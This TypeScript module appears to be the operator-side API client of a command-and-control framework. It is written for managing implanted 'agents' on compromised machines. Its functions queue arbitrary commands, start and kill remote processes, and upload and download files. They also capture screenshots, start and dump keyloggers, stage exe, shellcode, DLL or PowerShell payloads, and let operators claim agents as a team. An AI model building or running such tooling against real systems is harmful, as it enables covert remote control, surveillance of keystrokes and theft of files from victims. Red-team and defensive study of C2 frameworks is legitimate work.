import axios from 'axios'
import type { Agent, Command, Stats, Stage, LogEntry } from './types'

interface Envelope<T = unknown> {
  success: boolean
  message?: string
  data?:   T
  error?:  string
}

const http = axios.create({
  baseURL: '/api/v1',
  timeout: 30_000,
  headers: { 'Content-Type': 'application/json' },
})

http.interceptors.request.use((cfg: import('axios').InternalAxiosRequestConfig) => {
  const key = localStorage.getItem('c2_api_key')
  if (key) cfg.headers['X-API-Key'] = key
  return cfg
})

// ── Agents ─────────────────────────────────────────────────────────────────
export const agentApi = {
  list: () =>
    http.get<Envelope<{ agents?: Agent[] }>>('/agents'),
  get: (id: string) =>
    http.get<Envelope<Agent>>(`/agents/${id}`),
  del: (id: string) =>
    http.delete<Envelope>(`/agents/${id}`),
}

// ── Commands ────────────────────────────────────────────────────────────────
export const commandApi = {
  queue: (agentId: string, payload: Record<string, unknown>) =>
    http.post<Envelope<{ command_id?: string }>>('/command', { agent_id: agentId, ...payload }),

  get: (id: string) =>
    http.get<Envelope<Command & { output?: string; error?: string; status?: string }>>(`/command/${id}/status`),

  list: (params: { agent_id?: string; status?: string; limit?: number }) =>
    http.get<Envelope<{ commands?: Command[]; count?: number }>>(
      params.agent_id ? `/agent/${params.agent_id}/commands` : '/commands',
      { params: { status: params.status, limit: params.limit } }
    ),

  clearQueue: (agentId: string) =>
    http.delete<Envelope>(`/agent/${agentId}/queue`),

  stats: () =>
    http.get<Envelope<Stats>>('/queue/stats'),
}

// ── Process Management ──────────────────────────────────────────────────────
export const processApi = {
  list:  (agentId: string) =>
    http.post<Envelope<{ processes?: ProcessEntry[] }>>(`/agent/${agentId}/process/list`, {}),
  kill:  (agentId: string, pid: number) =>
    http.post<Envelope>(`/agent/${agentId}/process/kill`, { pid }),
  start: (agentId: string, path: string, args: string) =>
    http.post<Envelope>(`/agent/${agentId}/process/start`, { path, args }),
}

// ── File Operations ──────────────────────────────────────────────────────────
export const fileApi = {
  upload: (agentId: string, destPath: string, content: string) =>
    http.post<Envelope>(`/agent/${agentId}/upload`, { destination_path: destPath, file_content: content }),
  download: (agentId: string, srcPath: string) =>
    http.post<Envelope<{ file_content?: string; path?: string }>>(`/agent/${agentId}/download`, { source_path: srcPath }),
}

// ── Recon ──────────────────────────────────────────────────────────────────
export const reconApi = {
  screenshot: (agentId: string) =>
    http.post<Envelope<{ command_id?: string }>>(`/agent/${agentId}/screenshot`, {}),
  keylogStart: (agentId: string) =>
    http.post<Envelope<{ command_id?: string }>>(`/agent/${agentId}/keylog/start`, {}),
  keylogDump:  (agentId: string) =>
    http.post<Envelope<{ command_id?: string }>>(`/agent/${agentId}/keylog/dump`, {}),
  keylogStop:  (agentId: string) =>
    http.post<Envelope<{ command_id?: string }>>(`/agent/${agentId}/keylog/stop`, {}),
  keylogClear: (agentId: string) =>
    http.post<Envelope>(`/agent/${agentId}/keylog/clear`, {}),
}

// ── Server ──────────────────────────────────────────────────────────────────
export const serverApi = {
  stats:  () =>
    http.get<Envelope<Stats>>('/stats'),
  health: () =>
    http.get<Envelope<HealthStatus>>('/health'),
  logs: (params: { level?: string; limit?: number; agent_id?: string }) =>
    http.get<Envelope<{ logs?: LogEntry[] }>>('/logs', { params }),
}

// ── Stages ──────────────────────────────────────────────────────────────────
export const stageApi = {
  list:   () =>
    http.get<Envelope<{ stages?: Stage[] }>>('/stages'),
  create: (data: StageCreatePayload) =>
    http.post<Envelope<Stage>>('/stage', data, { timeout: 120_000 }),
  delete: (token: string) =>
    http.delete<Envelope>(`/stage/${token}`),
}

// ── Team ────────────────────────────────────────────────────────────────────
export const teamApi = {
  operators: () =>
    http.get<Envelope<{ operators?: { id: string; name: string }[] }>>('/team/operators'),
  register: (name: string) =>
    http.post<Envelope>('/team/register', { name }),
  broadcast: (message: string, eventType = 'broadcast') =>
    http.post<Envelope>('/team/broadcast', { type: eventType, message }),
  claim:   (agentId: string) =>
    http.post<Envelope>(`/team/agent/${agentId}/claim`, {}),
  release: (agentId: string) =>
    http.post<Envelope>(`/team/agent/${agentId}/release`, {}),
  claimStatus: (agentId: string) =>
    http.get<Envelope<{ claimed: boolean; operator?: string }>>(`/team/agent/${agentId}/claim`),
}

// ── Shared types used by callers ────────────────────────────────────────────
export interface ProcessEntry {
  pid:  number
  name: string
  user: string
  cpu:  number
  mem:  number
  path?: string
}

export interface HealthStatus {
  status:    'healthy' | 'degraded' | 'unhealthy'
  timestamp: string
  uptime:    string
  version:   string
  server_id: string
  components?: Record<string, string>
  issues?:     string[]
}

export interface StageCreatePayload {
  payload:     string // base64-encoded binary
  format:      string // exe | shellcode | dll | ps1
  arch:        string // amd64 | x86
  os:          string // windows | linux | macos
  description: string
  ttl_hours:   number
}

export default http
